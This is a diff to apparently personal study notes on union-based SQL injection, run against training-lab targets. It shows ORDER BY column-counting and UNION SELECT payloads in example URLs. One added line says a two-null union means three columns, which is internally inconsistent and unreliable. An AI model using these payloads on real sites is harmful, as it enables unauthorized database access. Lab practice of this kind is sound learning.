@@ -32,6 +32,11 @@ http://10.10.211.148/post?id=2 order by 4--+--
 http://10.10.211.148/post?id=2 order by 1,2,3,4--+--
 if order by 5 --+-- ( there is no column 5 so, totally, column 4 is available)
 
+We can also use UNION SELECT NULL,NULL,NULL-- (to identify how many columns occured)
+
+https://0a2a006a046fa80d8117ca5d00130050.web-security-academy.net/filter?category=Accessories' union select null,null-- (That means it has 3 columns)
+
+
 Which column will be enumerated with UNION BASED SQL INJECTION
 ----------------------------------------------------------------
 http://10.10.211.148/post?id=-2 union select 1,2,3,4--+--[inserting -(null value) infront of 2]
